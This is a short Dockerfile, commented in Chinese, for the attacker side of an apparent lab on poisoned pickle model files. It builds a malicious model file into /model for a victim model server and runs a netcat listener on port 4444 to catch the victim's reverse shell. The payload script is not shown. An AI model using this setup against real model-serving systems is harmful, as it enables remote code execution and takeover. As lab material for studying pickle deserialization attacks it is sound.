FROM python:3.11-slim

# 安装 netcat，用于监听反弹 shell 连接
# pickle 是 Python 内置模块，不需要额外安装任何库
RUN apt-get update && apt-get install -y netcat-traditional && rm -rf /var/lib/apt/lists/*

WORKDIR /attack
COPY create_payload.py .

# 创建 /model 目录，create_payload.py 会把 pkl 文件写到这里
RUN mkdir -p /model

# 构建镜像时就生成恶意模型文件，输出到 /model 目录供 model_server 使用
RUN python create_payload.py

# 容器启动后监听 4444 端口，等待 victim 的反弹 shell 连入
CMD ["nc", "-lnvp", "4444"]